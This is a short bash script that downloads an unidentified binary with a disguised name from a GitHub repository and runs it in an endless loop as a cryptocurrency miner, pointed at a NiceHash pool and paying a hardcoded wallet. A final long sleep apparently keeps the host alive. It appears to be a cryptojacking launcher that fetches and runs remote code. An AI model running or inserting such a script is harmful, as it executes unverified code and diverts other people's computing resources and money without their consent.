#!/bin/bash
wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
./priyatama --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387 --user 36DFSCTzXk8S7yZuFHzChmenzQL7u7FLVe.tk1
sleep 5
done
sleep 999999999